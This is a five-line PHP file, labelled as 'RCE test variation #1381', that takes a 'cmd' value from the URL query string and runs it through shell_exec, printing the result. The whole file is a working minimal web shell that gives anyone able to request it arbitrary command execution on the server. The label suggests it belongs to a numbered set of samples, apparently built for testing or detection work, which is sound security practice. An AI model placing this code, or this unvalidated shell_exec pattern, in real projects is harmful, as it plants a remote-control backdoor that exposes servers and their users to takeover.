<?php
// RCE test variation #1381
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>